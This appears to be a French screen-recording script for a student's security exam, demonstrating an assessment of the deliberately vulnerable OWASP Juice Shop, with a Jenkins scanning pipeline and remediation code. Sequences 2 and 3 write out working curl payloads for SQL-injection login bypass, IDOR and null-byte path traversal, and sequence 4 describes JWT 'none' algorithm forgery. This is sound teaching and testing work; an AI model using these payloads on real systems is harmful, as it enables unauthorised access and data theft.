# SCRIPT DE DÉMONSTRATION VIDÉO — Examen Sécurité des Données

**Durée cible :** 8–10 minutes  
**Format :** Enregistrement écran + voix  
**Outil suggéré :** OBS Studio ou Kazam

---

## Checklist avant d'enregistrer

Lancer le script de pré-vérification :
```bash
bash projet_examen/demo_precheck.sh
```

Vérifier manuellement :
- [ ] OBS / outil d'enregistrement prêt
- [ ] Terminal en plein écran, police lisible (taille 16+)
- [ ] Onglets navigateur pré-ouverts : Juice Shop, Jenkins, MailHog
- [ ] ngrok actif (`ngrok http 8080`)
- [ ] Pas de notifications/popups sur le bureau

---

## SÉQUENCE 1 — Introduction [0:00 → 0:45]

### Ce qu'on dit :

> « Bonjour. Je vais présenter l'évaluation de sécurité que j'ai réalisée sur OWASP Juice Shop dans le cadre de l'examen final du cours Sécurité des Données.
>
> Juice Shop est une application web volontairement vulnérable développée par l'OWASP. Mon rôle est celui d'un Cybersecurity Analyst chargé de déterminer si cette application peut être mise en production.
>
> J'ai identifié 11 vulnérabilités en utilisant 5 outils complémentaires, dont HDWP, un moteur de pentest sémantique que j'ai développé. Ma conclusion est Reject Deployment. »

### Ce qu'on montre :

1. Navigateur → http://localhost:3000 (page d'accueil Juice Shop)
2. Faire défiler la page pour montrer que c'est une vraie application (produits, panier, login)

---

## SÉQUENCE 2 — SQL Injection (V2) [0:45 → 2:30]

### Ce qu'on dit :

> « La vulnérabilité la plus critique est une injection SQL sur le formulaire de login. Score CVSS 9.8 sur 10 — le maximum. Elle permet d'obtenir un accès administrateur complet sans connaître aucun mot de passe. »

### Ce qu'on fait dans le terminal :

```bash
# 1. Requête normale — login échoué
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"wrong"}' \
  http://localhost:3000/rest/user/login | python3 -m json.tool
```

> « Avec un email normal, on obtient une erreur d'authentification. Maintenant, injectons du SQL. »

```bash
# 2. Injection SQL — obtention du JWT admin
curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR '1'='1'--\",\"password\":\"x\"}" \
  http://localhost:3000/rest/user/login | python3 -m json.tool
```

> « On reçoit un token JWT. Décodons-le pour voir ce qu'il contient. »

```bash
# 3. Décoder le JWT (copier le token du résultat précédent)
TOKEN=$(curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR '1'='1'--\",\"password\":\"x\"}" \
  http://localhost:3000/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

> « Le token contient l'id 1, l'email admin@juice-sh.op, le rôle admin, et même le hash MD5 du mot de passe. Avec ce token, on a un accès total à l'application. »

---

## SÉQUENCE 3 — IDOR + Path Traversal (V3, V4) [2:30 → 3:45]

### Ce qu'on dit :

> « Ce n'est pas la seule faille. Voici un IDOR — on peut lire le panier d'un autre utilisateur. »

### Ce qu'on fait :

```bash
# 1. Accéder au panier de l'admin (id=1) avec notre token
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/rest/basket/1 | python3 -m json.tool
```

> « L'API ne vérifie pas si on est le propriétaire du panier. Et voici un path traversal — des fichiers internes téléchargeables. »

```bash
# 2. Fichier confidentiel accessible sans auth
curl -s http://localhost:3000/ftp/acquisitions.md | head -5

# 3. Contournement du filtre .bak via null byte
curl -s --path-as-is "http://localhost:3000/ftp/package.json.bak%2500.md" | head -10
```

> « Le double encodage du null byte contourne le filtre d'extension et nous donne accès aux fichiers .bak normalement bloqués. »

---

## SÉQUENCE 4 — HDWP : vulnérabilités non détectées par les outils classiques (V10, V11) [3:45 → 5:15]

### Ce qu'on dit :

> « Les outils classiques comme ZAP ou Semgrep n'ont pas détecté toutes les vulnérabilités. J'ai utilisé HDWP, un moteur de pentest sémantique que j'ai développé. HDWP fonctionne par falsification d'hypothèses : il formule des propriétés de sécurité attendues, puis essaie de les casser avec des expériences. »

### Ce qu'on montre :

```bash
# Montrer le contexte de scan HDWP
cat projet_examen/juiceshop-hdwp-context.yaml
```

> « Le contexte définit 3 rôles — anonymous, customer et admin — avec leurs JWT respectifs. HDWP va comparer le comportement de l'application entre ces rôles. »

```bash
# Montrer le résumé des résultats HDWP
cat projet_examen/reports/hdwp/summary.json | python3 -m json.tool
```

> « 91 findings avec une confiance moyenne de 95.8%. Les plus importants sont les 10 findings HIGH. »

```bash
# Montrer les findings HIGH
python3 -c "
import json
with open('projet_examen/reports/hdwp/findings.json') as f:
    data = json.load(f)
findings = data if isinstance(data, list) else data.get('findings', [])
high = [f for f in findings if f.get('severity') == 'HIGH']
for f in high[:5]:
    cwe = f.get('cwe', '?')
    title = f.get('title', f.get('hypothesis', '?'))[:70]
    conf = f.get('confidence', 0)
    print(f'CWE-{cwe} | {conf}% | {title}')
"
```

> « HDWP a trouvé deux vulnérabilités que ni ZAP, ni Semgrep, ni mes tests manuels n'avaient détectées :
>
> V10 — JWT Algorithm None : l'application accepte des tokens JWT signés avec l'algorithme "none", ce qui permet de forger un token admin sans connaître la clé privée.
>
> V11 — BFLA sur 5 endpoints : des fonctions admin comme /api/Complaints ou /api/Cards sont accessibles avec un simple compte customer. HDWP l'a découvert grâce à son analyse cross-role. »

---

## SÉQUENCE 5 — Pipeline Jenkins + Webhook [5:15 → 7:00]

### Ce qu'on dit :

> « Pour automatiser ces vérifications à chaque commit, j'ai configuré un pipeline Jenkins avec 6 étapes et un webhook GitHub. Un simple git push déclenche automatiquement le pipeline. »

### Ce qu'on montre :

1. **Navigateur → http://localhost:8080** → montrer le job `juice-shop-security`
2. Montrer l'historique des builds (dernier build UNSTABLE = attendu)

> « Déclenchons un build. Normalement, c'est automatique via webhook GitHub à chaque push, mais on peut aussi le lancer manuellement. »

3. Cliquer **Build Now**
4. Ouvrir **Console Output** → montrer les logs qui défilent

> « Le pipeline exécute 6 étapes :
> - Checkout du code depuis GitHub
> - Vérification que Juice Shop est accessible
> - Analyse statique avec Semgrep et audit des dépendances avec npm audit, en parallèle
> - Analyse dynamique avec ZAP, HDWP et détection de secrets avec trufflehog, en parallèle
> - Génération du rapport consolidé
> - Notification email »

5. Une fois terminé, montrer le statut **UNSTABLE** (icône jaune)

> « UNSTABLE signifie que des vulnérabilités ont été détectées — c'est le comportement attendu sur Juice Shop. »

6. **Navigateur → http://localhost:8025** (MailHog) → montrer l'email reçu

> « L'email de notification est capturé par MailHog. Il contient le résumé du build, les outils exécutés et la décision de déploiement. »

7. Ouvrir l'email → montrer le contenu HTML

---

## SÉQUENCE 6 — Remédiation [7:00 → 8:00]

### Ce qu'on dit :

> « Pour les vulnérabilités les plus critiques, j'ai implémenté des correctifs concrets. »

### Ce qu'on montre (ouvrir les fichiers dans l'éditeur ou cat) :

```bash
# Remédiation SQLi — requêtes paramétrées
head -40 projet_examen/remediation/sqli_fix.js
```

> « Au lieu de concaténer l'email dans la requête SQL, on utilise une requête paramétrée Sequelize. La valeur n'est plus jamais interprétée comme du SQL. »

```bash
# Remédiation JWT alg_none — forcer RS256
head -36 projet_examen/remediation/jwt_fix.js
```

> « On force l'algorithme RS256 dans jwt.verify. Tout token avec alg=none est automatiquement rejeté. »

```bash
# Remédiation BFLA — middleware de contrôle par rôle
head -50 projet_examen/remediation/bfla_fix.js
```

> « Un middleware requireRole vérifie que l'utilisateur a le bon rôle avant d'accéder aux endpoints admin. »

---

## SÉQUENCE 7 — Rapport + Décision finale [8:00 → 8:45]

### Ce qu'on dit :

> « Toute l'analyse est documentée dans un rapport structuré en 10 sections. »

### Ce qu'on montre :

1. Ouvrir `reports/rapport_final_examen.html` dans le navigateur
2. Scroller rapidement en pointant les sections :
   - Tableau des 11 vulnérabilités
   - Classification CWE et OWASP
   - Analyse CIA
   - Tableau de complémentarité des outils (HDWP vs ZAP vs Semgrep)

> « Ma décision est **Reject Deployment**. L'application présente une vulnérabilité Critical à CVSS 9.8, sept High, et deux Medium. La chaîne d'exploitation démontrée — injection SQL vers token admin vers accès total — rend le déploiement impossible sans correction préalable. Les vulnérabilités V10 et V11 découvertes par HDWP ajoutent un deuxième vecteur d'accès admin indépendant de la SQLi. »

---

## SÉQUENCE 8 — Conclusion [8:45 → 9:15]

### Ce qu'on dit :

> « Ce projet illustre trois points essentiels.
>
> Premièrement, aucun outil seul ne suffit. Semgrep, ZAP et HDWP couvrent des angles différents — sur 11 vulnérabilités, aucun outil n'en détecte plus de 9.
>
> Deuxièmement, l'automatisation est indispensable. Le pipeline Jenkins vérifie la sécurité à chaque commit, avec notification immédiate.
>
> Troisièmement, l'analyse humaine reste nécessaire pour comprendre les chaînes d'attaque et l'impact métier réel.
>
> Merci. »

---

## Commandes de secours

Si quelque chose ne marche pas pendant l'enregistrement :

```bash
# Juice Shop down ?
export DOCKER_HOST="unix:///home/virus-one/.docker/desktop/docker.sock"
cd /home/virus-one/cours_simac_l3/Semestre_6/Sec_data/projet/labs_v2/lab1-jenkins
docker compose up -d

# Jenkins ne répond pas ?
docker compose restart jenkins

# MailHog down ?
docker compose stop mailhog && docker compose rm -f mailhog && docker compose up -d mailhog

# ngrok coupé ?
ngrok http 8080

# Le build ne se déclenche pas via webhook ?
# → Lancer manuellement depuis Jenkins : Build Now
```
